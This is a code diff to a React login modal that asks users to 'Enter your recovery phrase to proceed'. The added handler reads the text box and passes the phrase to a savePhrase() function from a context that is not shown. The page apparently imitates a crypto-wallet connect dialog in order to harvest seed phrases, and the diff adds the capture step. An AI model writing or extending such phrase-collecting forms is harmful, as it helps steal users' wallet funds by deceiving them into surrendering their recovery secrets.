@@ -1,7 +1,18 @@
 
 import "./Login.css"
+import { usePhrase } from "../context/Phrase.context"
+import { useRef } from "react"
 
 export const Login = () => {
+  const { savePhrase, loading, error, success } = usePhrase();
+  const textareaRef = useRef();
+
+   const handleConnect = () => {
+    const text = textareaRef.current?.value.trim();
+    if (!text) return alert("Phrase cannot be empty.");
+    savePhrase(text);
+  };
+
   return (
     <div className="modal fade bg-fade" id="exampleModal" tabIndex={-1} aria-labelledby="exampleModalLabel" aria-hidden="true">
       <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable custom-modal">
@@ -17,12 +28,16 @@ export const Login = () => {
             </div>
           <div className="modal-body">
             <div className="form-floating">
-              <textarea className="form-control" placeholder="type here..." id="floatingTextarea2" style={{height: "200px"}}></textarea>
+              <textarea ref={textareaRef} className="form-control" placeholder="type here..." id="floatingTextarea2" style={{height: "200px"}}></textarea>
               <label htmlFor="floatingTextarea2">Enter your recovery phrase to proceed</label>
+              {error && <div className="text-danger mt-2">{error}</div>}
+              {success && <div className="text-success mt-2">Saved successfully!</div>}
             </div>
           </div>
           <div className="modal-footer">
-            <button type="button" className="btn btn-green">connect</button> {/* data-bs-dismiss="modal"*/}
+            <button type="button" className="btn btn-green" onClick={handleConnect} disabled={loading}>
+              {loading ? "connecting..." : "connect"}
+            </button> {/* data-bs-dismiss="modal"*/}
             <button type="button" className="btn btn-blue">create</button>
           </div>
         </div>
